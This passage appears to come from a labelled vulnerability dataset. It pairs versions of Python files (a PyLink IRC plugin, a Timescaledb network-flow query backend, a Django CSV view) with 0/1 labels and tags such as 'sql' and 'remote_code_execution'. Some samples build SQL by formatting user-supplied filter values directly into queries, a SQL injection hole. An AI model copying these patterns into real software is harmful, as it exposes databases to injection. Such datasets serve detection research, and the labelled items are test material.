        for k, v in self.irc.servers.items():
            if v.name.lower() == name:
                return k
        else:
            return sname  # Fall back to given text instead of None

    def _getUid(self, target):
        """"""Converts a nick argument to its matching UID. This differs from irc.nickToUid()
        in that it returns the original text instead of None, if no matching nick is found.""""""
        target = self.irc.nickToUid(target) or target
        return target

    @classmethod
    def parsePrefixedArgs(cls, args):
        """"""Similar to parseArgs(), but stripping leading colons from the first argument
        of a line (usually the sender field).""""""
        args = cls.parseArgs(args)
        args[0] = args[0].split(':', 1)[1]
        return args

    def _squit(self, numeric, command, args):
        """"""Handles incoming SQUITs.""""""

        split_server = self._getSid(args[0])

        # Normally we'd only need to check for our SID as the SQUIT target, but Nefarious
        # actually uses the uplink server as the SQUIT target.
        # <- ABAAE SQ nefarious.midnight.vpn 0 :test
        if split_server in (self.irc.sid, self.irc.uplink):
            raise ProtocolError('SQUIT received: (reason: %s)' % args[-1])

        affected_users = []
        affected_nicks = defaultdict(list)
        log.debug('(%s) Splitting server %s (reason: %s)', self.irc.name, split_server, args[-1])

        if split_server not in self.irc.servers:
            log.warning(""(%s) Tried to split a server (%s) that didn't exist!"", self.irc.name, split_server)
            return

        # Prevent RuntimeError: dictionary changed size during iteration
        old_servers = self.irc.servers.copy()
        old_channels = self.irc.channels.copy()

        # Cycle through our list of servers. If any server's uplink is the one that is being SQUIT,
        # remove them and all their users too.
        for sid, data in old_servers.items():
            if data.uplink == split_server:
                log.debug('Server %s also hosts server %s, removing those users too...', split_server, sid)
                # Recursively run SQUIT on any other hubs this server may have been connected to.
                args = self._squit(sid, 'SQUIT', [sid, ""0"",
                                   ""PyLink: Automatically splitting leaf servers of %s"" % sid])
                affected_users += args['users']

        for user in self.irc.servers[split_server].users.copy():
            affected_users.append(user)
            nick = self.irc.users[user].nick

            # Nicks affected is channel specific for SQUIT:. This makes Clientbot's SQUIT relaying
            # much easier to implement.
            for name, cdata in old_channels.items():
                if user in cdata.users:
                    affected_nicks[name].append(nick)

            log.debug('Removing client %s (%s)', user, nick)
            self.removeClient(user)

        serverdata = self.irc.servers[split_server]
        sname = serverdata.name
        uplink = serverdata.uplink

        del self.irc.servers[split_server]
        log.debug('(%s) Netsplit affected users: %s', self.irc.name, affected_users)

        return {'target': split_server, 'users': affected_users, 'name': sname,
                'uplink': uplink, 'nicks': affected_nicks, 'serverdata': serverdata,
                'channeldata': old_channels}

    @staticmethod
    def parseCapabilities(args, fallback=''):
        """"""
        Parses a string of capabilities in the 005 / RPL_ISUPPORT format.
        """"""

        if type(args) == str:
            args = args.split(' ')

        caps = {}
        for cap in args:
            try:
                # Try to split it as a KEY=VALUE pair.
                key, value = cap.split('=', 1)
            except ValueError:
                key = cap
                value = fallback
            caps[key] = value

        return caps

    @staticmethod
    def parsePrefixes(args):
        """"""
        Separates prefixes field like ""(qaohv)~&@%+"" into a dict mapping mode characters to mode
        prefixes.
        """"""
        prefixsearch = re.search(r'\(([A-Za-z]+)\)(.*)', args)
        return dict(zip(prefixsearch.group(1), prefixsearch.group(2)))

    def handle_error(self, numeric, command, args):
        """"""Handles ERROR messages - these mean that our uplink has disconnected us!""""""
        raise ProtocolError('Received an ERROR, disconnecting!')
/n/n/nplugins/networks.py/n/n""""""Networks plugin - allows you to manipulate connections to various configured networks.""""""
import importlib
import types

from pylinkirc import utils, world, conf, classes
from pylinkirc.log import log
from pylinkirc.coremods import control, permissions

@utils.add_cmd
def disconnect(irc, source, args):
    """"""<network>

    Disconnects the network <network>. When all networks are disconnected, PyLink will automatically exit.

    To reconnect a network disconnected using this command, use REHASH to reload the networks list.""""""
    permissions.checkPermissions(irc, source, ['networks.disconnect'])
    try:
        netname = args[0]
        network = world.networkobjects[netname]
    except IndexError:  # No argument given.
        irc.error('Not enough arguments (needs 1: network name (case sensitive)).')
        return
    except KeyError:  # Unknown network.
        irc.error('No such network ""%s"" (case sensitive).' % netname)
        return
    irc.reply(""Done. If you want to reconnect this network, use the 'rehash' command."")

    control.remove_network(network)

@utils.add_cmd
def autoconnect(irc, source, args):
    """"""<network> <seconds>

    Sets the autoconnect time for <network> to <seconds>.
    You can disable autoconnect for a network by setting <seconds> to a negative value.""""""
    permissions.checkPermissions(irc, source, ['networks.autoconnect'])
    try:
        netname = args[0]
        seconds = float(args[1])
        network = world.networkobjects[netname]
    except IndexError:  # Arguments not given.
        irc.error('Not enough arguments (needs 2: network name (case sensitive), autoconnect time (in seconds)).')
        return
    except KeyError:  # Unknown network.
        irc.error('No such network ""%s"" (case sensitive).' % netname)
        return
    except ValueError:
        irc.error('Invalid argument ""%s"" for <seconds>.' % seconds)
        return
    network.serverdata['autoconnect'] = seconds
    irc.reply(""Done."")

remote_parser = utils.IRCParser()
remote_parser.add_argument('network')
remote_parser.add_argument('--service', type=str, default='pylink')
remote_parser.add_argument('command', nargs=utils.IRCParser.REMAINDER)
@utils.add_cmd
def remote(irc, source, args):
    """"""<network> [--service <service name>] <command>

    Runs <command> on the remote network <network>. Plugin responses sent using irc.reply() are
    supported and returned here, but others are dropped due to protocol limitations.""""""
    permissions.checkPermissions(irc, source, ['networks.remote'])

    args = remote_parser.parse_args(args)
    netname = args.network

    if netname == irc.name:
        # This would actually throw _remote_reply() into a loop, so check for it here...
        # XXX: properly fix this.
        irc.error(""Cannot remote-send a command to the local network; use a normal command!"")
        return

    try:
        remoteirc = world.networkobjects[netname]
    except KeyError:  # Unknown network.
        irc.error('No such network ""%s"" (case sensitive).' % netname)
        return

    if args.service not in world.services:
        irc.error('Unknown service %r.' % args.service)
        return

    # Force remoteirc.called_in to something private in order to prevent
    # accidental information leakage from replies.
    remoteirc.called_in = remoteirc.called_by = remoteirc.pseudoclient.uid

    # Set the identification override to the caller's account.
    remoteirc.pseudoclient.account = irc.users[source].account

    def _remote_reply(placeholder_self, text, **kwargs):
        """"""
        reply() rerouter for the 'remote' command.
        """"""
        assert irc.name != placeholder_self.name, \
            ""Refusing to route reply back to the same "" \
            ""network, as this would cause a recursive loop""
        log.debug('(%s) networks.remote: re-routing reply %r from network %s', irc.name,
                  text, placeholder_self.name)

        # Override the source option to make sure the source is valid on the local network.
        if 'source' in kwargs:
            del kwargs['source']
        irc.reply(text, source=irc.pseudoclient.uid, **kwargs)

    old_reply = remoteirc._reply

    with remoteirc.reply_lock:
        try:  # Remotely call the command (use the PyLink client as a dummy user).
            # Override the remote irc.reply() to send replies HERE.
            log.debug('(%s) networks.remote: overriding reply() of IRC object %s', irc.name, netname)
            remoteirc._reply = types.MethodType(_remote_reply, remoteirc)
            world.services[args.service].call_cmd(remoteirc, remoteirc.pseudoclient.uid,
                                                  ' '.join(args.command))
        finally:
            # Restore the original remoteirc.reply()
            log.debug('(%s) networks.remote: restoring reply() of IRC object %s', irc.name, netname)
            remoteirc._reply = old_reply
            # Remove the identification override after we finish.
            remoteirc.pseudoclient.account = ''

@utils.add_cmd
def reloadproto(irc, source, args):
    """"""<protocol module name>

    Reloads the given protocol module without restart. You will have to manually disconnect and reconnect any network using the module for changes to apply.""""""
    permissions.checkPermissions(irc, source, ['networks.reloadproto'])
    try:
        name = args[0]
    except IndexError:
        irc.error('Not enough arguments (needs 1: protocol module name)')
        return

    proto = utils.getProtocolModule(name)
    importlib.reload(proto)

    irc.reply(""Done. You will have to manually disconnect and reconnect any network using the %r module for changes to apply."" % name)
/n/n/n",0,remote_code_execution
11,77,9d9b01839cf3639e59d29c27e70688bdbf44db96,"/plugins/networks.py/n/n""""""Networks plugin - allows you to manipulate connections to various configured networks.""""""
import importlib
import types

from pylinkirc import utils, world, conf, classes
from pylinkirc.log import log
from pylinkirc.coremods import control, permissions

@utils.add_cmd
def disconnect(irc, source, args):
    """"""<network>

    Disconnects the network <network>. When all networks are disconnected, PyLink will automatically exit.

    To reconnect a network disconnected using this command, use REHASH to reload the networks list.""""""
    permissions.checkPermissions(irc, source, ['networks.disconnect'])
    try:
        netname = args[0]
        network = world.networkobjects[netname]
    except IndexError:  # No argument given.
        irc.error('Not enough arguments (needs 1: network name (case sensitive)).')
        return
    except KeyError:  # Unknown network.
        irc.error('No such network ""%s"" (case sensitive).' % netname)
        return
    irc.reply(""Done. If you want to reconnect this network, use the 'rehash' command."")

    control.remove_network(network)

@utils.add_cmd
def autoconnect(irc, source, args):
    """"""<network> <seconds>

    Sets the autoconnect time for <network> to <seconds>.
    You can disable autoconnect for a network by setting <seconds> to a negative value.""""""
    permissions.checkPermissions(irc, source, ['networks.autoconnect'])
    try:
        netname = args[0]
        seconds = float(args[1])
        network = world.networkobjects[netname]
    except IndexError:  # Arguments not given.
        irc.error('Not enough arguments (needs 2: network name (case sensitive), autoconnect time (in seconds)).')
        return
    except KeyError:  # Unknown network.
        irc.error('No such network ""%s"" (case sensitive).' % netname)
        return
    except ValueError:
        irc.error('Invalid argument ""%s"" for <seconds>.' % seconds)
        return
    network.serverdata['autoconnect'] = seconds
    irc.reply(""Done."")

remote_parser = utils.IRCParser()
remote_parser.add_argument('network')
remote_parser.add_argument('--service', type=str, default='pylink')
remote_parser.add_argument('command', nargs=utils.IRCParser.REMAINDER)
@utils.add_cmd
def remote(irc, source, args):
    """"""<network> [--service <service name>] <command>

    Runs <command> on the remote network <network>. Plugin responses sent using irc.reply() are
    supported and returned here, but others are dropped due to protocol limitations.""""""
    permissions.checkPermissions(irc, source, ['networks.remote'])

    args = remote_parser.parse_args(args)
    netname = args.network

    if netname == irc.name:
        # This would actually throw _remote_reply() into a loop, so check for it here...
        # XXX: properly fix this.
        irc.error(""Cannot remote-send a command to the local network; use a normal command!"")
        return

    try:
        remoteirc = world.networkobjects[netname]
    except KeyError:  # Unknown network.
        irc.error('No such network ""%s"" (case sensitive).' % netname)
        return

    if args.service not in world.services:
        irc.error('Unknown service %r.' % args.service)
        return

    # Force remoteirc.called_in to something private in order to prevent
    # accidental information leakage from replies.
    remoteirc.called_in = remoteirc.called_by = remoteirc.pseudoclient.uid

    # Set the identification override to the caller's account.
    remoteirc.pseudoclient.account = irc.users[source].account

    def _remote_reply(placeholder_self, text, **kwargs):
        """"""
        reply() rerouter for the 'remote' command.
        """"""
        assert irc.name != placeholder_self.name, \
            ""Refusing to route reply back to the same "" \
            ""network, as this would cause a recursive loop""
        log.debug('(%s) networks.remote: re-routing reply %r from network %s', irc.name,
                  text, placeholder_self.name)

        # Override the source option to make sure the source is valid on the local network.
        if 'source' in kwargs:
            del kwargs['source']
        irc.reply(text, source=irc.pseudoclient.uid, **kwargs)

    old_reply = remoteirc.reply

    with remoteirc.reply_lock:
        try:  # Remotely call the command (use the PyLink client as a dummy user).
            # Override the remote irc.reply() to send replies HERE.
            log.debug('(%s) networks.remote: overriding reply() of IRC object %s', irc.name, netname)
            remoteirc.reply = types.MethodType(_remote_reply, remoteirc)
            world.services[args.service].call_cmd(remoteirc, remoteirc.pseudoclient.uid,
                                                  ' '.join(args.command))
        finally:
            # Restore the original remoteirc.reply()
            log.debug('(%s) networks.remote: restoring reply() of IRC object %s', irc.name, netname)
            remoteirc.reply = old_reply
            # Remove the identification override after we finish.
            remoteirc.pseudoclient.account = ''

@utils.add_cmd
def reloadproto(irc, source, args):
    """"""<protocol module name>

    Reloads the given protocol module without restart. You will have to manually disconnect and reconnect any network using the module for changes to apply.""""""
    permissions.checkPermissions(irc, source, ['networks.reloadproto'])
    try:
        name = args[0]
    except IndexError:
        irc.error('Not enough arguments (needs 1: protocol module name)')
        return

    proto = utils.getProtocolModule(name)
    importlib.reload(proto)

    irc.reply(""Done. You will have to manually disconnect and reconnect any network using the %r module for changes to apply."" % name)
/n/n/n",1,remote_code_execution
0,188,ef6a4d5639653ecfe27fd2335752fc98e7352075,"gfui/backends/Timescaledb/timescaledb.py/n/nfrom gfui.backends.default import Backend
import psycopg2
from gfui.chartgraph import Graph, Table
import re
import ipaddress
import os

class Timescaledb_backend(Backend):
    def __init__(self, OPTIONS):
        super().__init__()
        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']
        self.parse_options(OPTIONS)
        self.columns = {}

        pw = os.environ.get(""SQL_PASSWORD"")
        if not pw:
            pw = self.OPTIONS['SQL_PASSWORD']

        self.db = psycopg2.connect(
            ""dbname={0} user={1} password={2} host={3}"".format(
                self.OPTIONS['SQL_DB'],
                self.OPTIONS['SQL_USERNAME'],
                pw,
                self.OPTIONS['SQL_SERVER']
            )
        )

        self.schema = Schema()

        self.filters = []

    def get_columns(self):
        return self.schema.get_columns()

    def add_filter(self, op, value):
        self.schema.add_filter(value, op)

    def get_int_columns(self):
        return self.schema.get_int_columns()

    def flow_table(self, limit=10):
        db = self.db
        self.schema.limit = limit
        FLOWS = self.schema.flows()

        cursor = self.schema.query(db, FLOWS)
        r = cursor.fetchall()
        t = Table()
        t = t.table_from_rows(r, self.schema.column_order)
        return t

    def topn_sum_graph(self, field, sum_by, limit=10):
        db = self.db
        self.schema.limit = limit
        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)

        cursor = db.cursor()
        cursor.execute(FLOWS_PER_IP)
        r = cursor.fetchall()
        g = Graph()
        g.name = ""TopN {0}"".format(field)
        g.set_headers([
            field,
            ""Total""
        ])
        g.graph_from_rows(r, 0)
        return g

class Column:
    """"""
    Column

    Column handling class.
    Governs how query strings are built and helper functons for returned data.
    """"""
    def __init__(self, name, display_name=None):
        self.name = name
        self.display_name = display_name
        self.type = 'text'
        self.filter_string = None

    def get_display_name(self):
        return self.display_name

    def select(self):
        return ""{0}"".format(self.name)

    def filter(self, value, op=None):
        if self.filter_string:
            self.filter_string = self.filter_string + ""AND {2} {0} \""{1}\"""".format(op, value, self.name)
        else:
            self.filter_string = ""{2} {0} \""{1}\"""".format(op, value, self.name)

class IP4Column(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = ""ip""

    def select(self):
        return ""{0}"".format(self.name)

    def filter(self, value, op=None):
        s = value.split(""/"")
        if len(s) > 1:
            self.filter_string = ""({0} << '{1}'"".format(self.name, value)
        else:
            self.filter_string = ""{0} = '{1}'"".format(self.name, value)

        return self.filter_string

class IP6Column(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = ""ip6""

    def select(self):
        return ""{0}"".format(self.name)

    def filter(self, value, op=None):
        s = value.split(""/"")
        if len(s) > 1:
            ip = ipaddress.ip_network(value, strict=False)
            start_ip = ip.network_address
            end_ip = ip.broadcast_address
            self.filter_string = ""({0} > {1} AND {0} < {2})"".format(self.name, int(start_ip), int(end_ip))
        else:
            ip = ipaddress.ip_address(value)
            self.filter_string = ""{0} = {1}"".format(self.name, int(ip))

        return self.filter_string

class IntColumn(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = 'int'

    def select(self):
        return ""{0}"".format(self.name)

    def filter(self, value, op=None):
        self.filter_string = ""{0} = {1}"".format(self.name, value)
        return self.filter_string

class PortColumn(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = 'port'

    def select(self):
        return ""{0}"".format(self.name)

    def filter(self, value, op=None):
        self.filter_string = ""{0} = %s"".format(self.name, value)
        return self.filter_string

class Coalesce:
    def __init__(self, name, columns, filter_func, display_name):
        """"""
        Coalesce
        Select from a list of columns whatever is not null
        :param columns (List): Column objects
        """"""
        self.name = name
        self.columns = columns
        # We assume that the passed columns are of roughly the same type
        self.type = columns[0].type
        self.column_selects = []
        for c in columns:
            self.column_selects.append(c.select())

        self.filter_string = None
        self.filter_func = filter_func
        self.display_name = display_name

    def get_display_name(self):
        return self.display_name

    def select(self):
        fields = "", "".join(self.column_selects)
        return ""COALESCE({0}) AS {1}"".format(fields, self.name)

    def filter(self, value, op=None):
        self.filter_string = self.filter_func(value, op)

class Schema:
    """"""
    Schema

    Defines the backend schema
    Changes to the backend (naming, etc.) should be reflected here.
    """"""
    def __init__(self):
        # Default
        self.limit = 10

        self.column_order = [
            ""last_switched"",
            ""src_ip"",
            ""src_port"",
            ""dst_ip"",
            ""dst_port"",
            ""in_bytes"",
        ]
        src_ip_col = IP4Column(""src_ip"", ""Source IP"")
        src_ipv6_col = IP6Column(""src_ipv6"", ""Source IPv6"")
        dst_ip_col = IP4Column(""dst_ip"", ""Destination IP"")
        dst_ipv6_col = IP6Column(""dst_ipv6"", ""DestinationIPv6"")

        self.filter_val_list = []

        # Columns
        self.columns = {
            ""last_switched"": Column(""last_switched"", ""Last Switched""),
            ""src_ip"": Coalesce(""src_c_ip"", [src_ip_col, src_ipv6_col], src_ip_col.filter, ""Source IP""),
            ""src_port"": PortColumn(""src_port"", ""Source Port""),
            ""dst_ip"": Coalesce(""dst_c_ip"", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, ""Destination IP""),
            ""dst_port"": PortColumn(""dst_port"", ""Destination Port""),
            ""in_bytes"": IntColumn(""in_bytes"", ""Input bytes""),
            ""in_pkts"": IntColumn(""in_pkts"", ""Input Packets""),
        }

        # Supported queries
        self.QUERIES = {
            ""TOPN"": self.topn
        }

        self.filters = []

        self.filter_map = {
            ""(\d+\-\d+\-\d+)"": ""last_switched"",
            ""src (\d+\.\d+\.\d+\.\d+\/\d+|\d+\.\d+\.\d+\.\d+)"": ""src_ip"",
            ""dst (\d+\.\d+\.\d+\.\d+\/\d+|\d+\.\d+\.\d+\.\d+)"": ""dst_ip"",
            ""src ([0-9]+)($|\s)"": ""src_port"",
            ""dst ([0-9]+)($|\s)"": ""dst_port"",
        }

    def add_filter(self, value, op=""=""):
        for regex, column in self.filter_map.items():
            if re.search(regex, value):
                m = re.search(regex, value)
                v = m.group(1)
                self.columns[column].filter(v, op)
                self.filter_val_list.append(v)

    def build_filter_string(self):
        s = 'WHERE '
        l = []
        for c in self.columns.values():
            if c.filter_string:
                l.append(c.filter_string)

        if len(l) > 0:
            return s + "" AND "".join(l)
        else:
            return ''

    def get_columns(self):
        result = {}
        for col_name, col in self.columns.items():
            result[col_name] = col.get_display_name()

        return result

    def get_int_columns(self):
        result = {}
        for col_name, col in self.columns.items():
            if col.type is ""int"":
                result[col_name] = col.get_display_name()

        return result

    def topn(self, column):
        count = ""last_switched""
        q = """"""
        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC
        """""".format(self.columns[column].select(), count, self.build_filter_string())
        return self.query_boilerplate(q)

    def topn_sum(self, column, sum_by):
        q = """"""
        SELECT {0}, sum({1}) AS c FROM goflow_records {2} GROUP BY {3} ORDER BY c DESC
        """""".format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)
        return self.query_boilerplate(q)

    def flows(self):
        c = []
        for col in self.column_order:
            c.append(self.columns[col].select())
        q = """"""
        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC
        """""".format(self.build_filter_string(), "", "".join(c))
        return self.query_boilerplate(q)

    def query_boilerplate(self, q):
        q = q + """"""LIMIT {0}"""""".format(self.limit)
        return q

    def query(self, db, q):
        cursor = db.cursor()
        cursor.execute(q, self.filter_val_list)
        return cursor/n/n/n",0,sql
1,189,ef6a4d5639653ecfe27fd2335752fc98e7352075,"/gfui/backends/Timescaledb/timescaledb.py/n/nfrom gfui.backends.default import Backend
import psycopg2
from gfui.chartgraph import Graph, Table
import re
import ipaddress
import os

class Timescaledb_backend(Backend):
    def __init__(self, OPTIONS):
        super().__init__()
        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']
        self.parse_options(OPTIONS)
        self.columns = {}

        pw = os.environ.get(""SQL_PASSWORD"")
        if not pw:
            pw = self.OPTIONS['SQL_PASSWORD']

        self.db = psycopg2.connect(
            ""dbname={0} user={1} password={2} host={3}"".format(
                self.OPTIONS['SQL_DB'],
                self.OPTIONS['SQL_USERNAME'],
                pw,
                self.OPTIONS['SQL_SERVER']
            )
        )

        self.schema = Schema()

        self.filters = []

    def get_columns(self):
        return self.schema.get_columns()

    def add_filter(self, op, value):
        self.schema.add_filter(value, op)

    def get_int_columns(self):
        return self.schema.get_int_columns()

    def flow_table(self, limit=10):
        db = self.db
        self.schema.limit = limit
        FLOWS = self.schema.flows()

        cursor = db.cursor()
        cursor.execute(FLOWS)
        r = cursor.fetchall()
        t = Table()
        t = t.table_from_rows(r, self.schema.column_order)
        return t

    def topn_sum_graph(self, field, sum_by, limit=10):
        db = self.db
        self.schema.limit = limit
        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)

        cursor = db.cursor()
        cursor.execute(FLOWS_PER_IP)
        r = cursor.fetchall()
        g = Graph()
        g.name = ""TopN {0}"".format(field)
        g.set_headers([
            field,
            ""Total""
        ])
        g.graph_from_rows(r, 0)
        return g

class Column:
    """"""
    Column

    Column handling class.
    Governs how query strings are built and helper functons for returned data.
    """"""
    def __init__(self, name, display_name=None):
        self.name = name
        self.display_name = display_name
        self.type = 'text'
        self.filter_string = None

    def get_display_name(self):
        return self.display_name

    def select(self):
        return ""{0}"".format(self.name)

    def filter(self, value, op=None):
        if self.filter_string:
            self.filter_string = self.filter_string + ""AND {2} {0} \""{1}\"""".format(op, value, self.name)
        else:
            self.filter_string = ""{2} {0} \""{1}\"""".format(op, value, self.name)

class IP4Column(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = ""ip""

    def select(self):
        return ""{0}"".format(self.name)

    def filter(self, value, op=None):
        s = value.split(""/"")
        if len(s) > 1:
            self.filter_string = ""({0} << '{1}'"".format(self.name, value)
        else:
            self.filter_string = ""{0} = '{1}'"".format(self.name, value)

        return self.filter_string

class IP6Column(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = ""ip6""

    def select(self):
        return ""{0}"".format(self.name)

    def filter(self, value, op=None):
        s = value.split(""/"")
        if len(s) > 1:
            ip = ipaddress.ip_network(value, strict=False)
            start_ip = ip.network_address
            end_ip = ip.broadcast_address
            self.filter_string = ""({0} > {1} AND {0} < {2})"".format(self.name, int(start_ip), int(end_ip))
        else:
            ip = ipaddress.ip_address(value)
            self.filter_string = ""{0} = {1}"".format(self.name, int(ip))

        return self.filter_string

class IntColumn(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = 'int'

    def select(self):
        return ""{0}"".format(self.name)

    def filter(self, value, op=None):
        self.filter_string = ""{0} = {1}"".format(self.name, value)
        return self.filter_string

class PortColumn(Column):
    def __init__(self, name, display_name=None):
        super().__init__(name, display_name)
        self.type = 'port'

    def select(self):
        return ""{0}"".format(self.name)

    def filter(self, value, op=None):
        self.filter_string = ""{0} = {1}"".format(self.name, value)
        return self.filter_string

class Coalesce:
    def __init__(self, name, columns, filter_func, display_name):
        """"""
        Coalesce
        Select from a list of columns whatever is not null
        :param columns (List): Column objects
        """"""
        self.name = name
        self.columns = columns
        # We assume that the passed columns are of roughly the same type
        self.type = columns[0].type
        self.column_selects = []
        for c in columns:
            self.column_selects.append(c.select())

        self.filter_string = None
        self.filter_func = filter_func
        self.display_name = display_name

    def get_display_name(self):
        return self.display_name

    def select(self):
        fields = "", "".join(self.column_selects)
        return ""COALESCE({0}) AS {1}"".format(fields, self.name)

    def filter(self, value, op=None):
        self.filter_string = self.filter_func(value, op)

class Schema:
    """"""
    Schema

    Defines the backend schema
    Changes to the backend (naming, etc.) should be reflected here.
    """"""
    def __init__(self):
        # Default
        self.limit = 10

        self.column_order = [
            ""last_switched"",
            ""src_ip"",
            ""src_port"",
            ""dst_ip"",
            ""dst_port"",
            ""in_bytes"",
        ]
        src_ip_col = IP4Column(""src_ip"", ""Source IP"")
        src_ipv6_col = IP6Column(""src_ipv6"", ""Source IPv6"")
        dst_ip_col = IP4Column(""dst_ip"", ""Destination IP"")
        dst_ipv6_col = IP6Column(""dst_ipv6"", ""DestinationIPv6"")

        # Filter tuples are filter values
        self.filter_tuples = ()

        # Columns
        self.columns = {
            ""last_switched"": Column(""last_switched"", ""Last Switched""),
            ""src_ip"": Coalesce(""src_c_ip"", [src_ip_col, src_ipv6_col], src_ip_col.filter, ""Source IP""),
            ""src_port"": PortColumn(""src_port"", ""Source Port""),
            ""dst_ip"": Coalesce(""dst_c_ip"", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, ""Destination IP""),
            ""dst_port"": PortColumn(""dst_port"", ""Destination Port""),
            ""in_bytes"": IntColumn(""in_bytes"", ""Input bytes""),
            ""in_pkts"": IntColumn(""in_pkts"", ""Input Packets""),
        }

        # Supported queries
        self.QUERIES = {
            ""TOPN"": self.topn
        }

        self.filters = []

        self.filter_map = {
            ""(\d+\-\d+\-\d+)"": ""last_switched"",
            ""src (\d+\.\d+\.\d+\.\d+\/\d+|\d+\.\d+\.\d+\.\d+)"": ""src_ip"",
            ""dst (\d+\.\d+\.\d+\.\d+\/\d+|\d+\.\d+\.\d+\.\d+)"": ""dst_ip"",
            ""src ([0-9]+)($|\s)"": ""src_port"",
            ""dst ([0-9]+)($|\s)"": ""dst_port"",
        }

    def add_filter(self, value, op=""=""):
        for regex, column in self.filter_map.items():
            if re.search(regex, value):
                m = re.search(regex, value)
                v = m.group(1)
                self.columns[column].filter(v, op)

    def build_filter_string(self):
        s = 'WHERE '
        l = []
        for c in self.columns.values():
            if c.filter_string:
                l.append(c.filter_string)

        if len(l) > 0:
            return s + "" AND "".join(l)
        else:
            return ''

    def get_columns(self):
        result = {}
        for col_name, col in self.columns.items():
            result[col_name] = col.get_display_name()

        return result

    def get_int_columns(self):
        result = {}
        for col_name, col in self.columns.items():
            if col.type is ""int"":
                result[col_name] = col.get_display_name()

        return result

    def topn(self, column):
        count = ""last_switched""
        q = """"""
        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC
        """""".format(self.columns[column].select(), count, self.build_filter_string())
        return self.query_boilerplate(q)

    def topn_sum(self, column, sum_by):
        q = """"""
        SELECT {0}, sum({1}) AS c FROM goflow_records {2} GROUP BY {3} ORDER BY c DESC
        """""".format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)
        return self.query_boilerplate(q)

    def flows(self):
        c = []
        for col in self.column_order:
            c.append(self.columns[col].select())
        q = """"""
        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC
        """""".format(self.build_filter_string(), "", "".join(c))
        return self.query_boilerplate(q)

    def query_boilerplate(self, q):
        q = q + """"""LIMIT {0}"""""".format(self.limit)
        return q

    def query(self, db, q):
        cursor = db.cursor()
        cursor.execute(q, self.filter_tuples)/n/n/n",1,sql
2,48,307587cc00d2290a433bf74bd305aecffcbb05a2,"wins/views/flat_csv.py/n/nimport collections
import csv
import functools
import io
import zipfile
from operator import attrgetter
import mimetypes

from django.conf import settings
from django.core.exceptions import ValidationError
from django.db import connection, models
from django.http import HttpResponse, StreamingHttpResponse
from django.utils.decorators import method_decorator
from django.utils.timezone import now
from django.views.decorators.gzip import gzip_page

from rest_framework import permissions
from rest_framework.views import APIView

from alice.authenticators import IsDataTeamServer
from ..constants import BREAKDOWN_TYPES
from ..models import Advisor, Breakdown, CustomerResponse, Notification, Win
from ..serializers import CustomerResponseSerializer, WinSerializer
from users .models import User


class CSVView(APIView):
    """""" Endpoint returning CSV of all Win data, with foreign keys flattened """"""

    permission_classes = (permissions.IsAdminUser,)
    # cache for speed
    win_fields = WinSerializer().fields
    customerresponse_fields = CustomerResponseSerializer().fields
    IGNORE_FIELDS = ['responded', 'sent', 'country_name', 'updated',
                     'complete', 'type', 'type_display',
                     'export_experience_display', 'location']

    def __init__(self, **kwargs):
        # cache some stuff to make flat CSV. like prefetch but works easily
        # with .values()
        self.users_map = {u.id: u for u in User.objects.all()}
        prefetch_tables = [
            ('advisors', Advisor),
            ('breakdowns', Breakdown),
            ('confirmations', CustomerResponse),
            ('notifications', Notification),
        ]
        self.table_maps = {}
        for table, model in prefetch_tables:
            prefetch_map = collections.defaultdict(list)
            instances = model.objects.all()
            if table == 'notifications':
                instances = instances.filter(type='c').order_by('created')
            for instance in instances:
                prefetch_map[instance.win_id].append(instance)
            self.table_maps[table] = prefetch_map
        super().__init__(**kwargs)

    def _extract_breakdowns(self, win):
        """""" Return list of 10 tuples, 5 for export, 5 for non-export """"""

        breakdowns = self.table_maps['breakdowns'][win['id']]
        retval = []
        for db_val, name in BREAKDOWN_TYPES:

            # get breakdowns of given type sorted by year
            type_breakdowns = [b for b in breakdowns if b.type == db_val]
            type_breakdowns = sorted(type_breakdowns, key=attrgetter('year'))

            # we currently solicit 5 years worth of breakdowns, but historic
            # data may have no input for some years
            for index in range(5):
                try:
                    breakdown = ""{0}: £{1:,}"".format(
                        type_breakdowns[index].year,
                        type_breakdowns[index].value,
                    )
                except IndexError:
                    breakdown = None

                retval.append((
                    ""{0} breakdown {1}"".format(name, index + 1),
                    breakdown,
                ))

        return retval

    def _confirmation(self, win):
        """""" Add fields for confirmation """"""

        if win['id'] in self.table_maps['confirmations']:
            confirmation = self.table_maps['confirmations'][win['id']][0]
        else:
            confirmation = None

        values = [
            ('customer response recieved',
             self._val_to_str(bool(confirmation)))
        ]
        for field_name in self.customerresponse_fields:
            if field_name in ['win']:
                continue

            model_field = self._get_customerresponse_field(field_name)
            if confirmation:
                if model_field.choices:
                    display_fn = getattr(
                        confirmation, ""get_{0}_display"".format(field_name)
                    )
                    value = display_fn()
                else:
                    value = getattr(confirmation, field_name)
            else:
                value = ''

            model_field_name = model_field.verbose_name or model_field.name
            if model_field_name == 'created':
                csv_field_name = 'date response received'
                if value:
                    value = value.date()  # just want date
            else:
                csv_field_name = model_field_name

            values.append((csv_field_name, self._val_to_str(value)))
        return values

    def _get_model_field(self, model, name):
        return next(
            filter(lambda field: field.name == name, model._meta.fields)
        )

    @functools.lru_cache(None)
    def _get_customerresponse_field(self, name):
        """""" Get field specified in CustomerResponse model """"""
        return self._get_model_field(CustomerResponse, name)

    @functools.lru_cache(None)
    def _get_win_field(self, name):
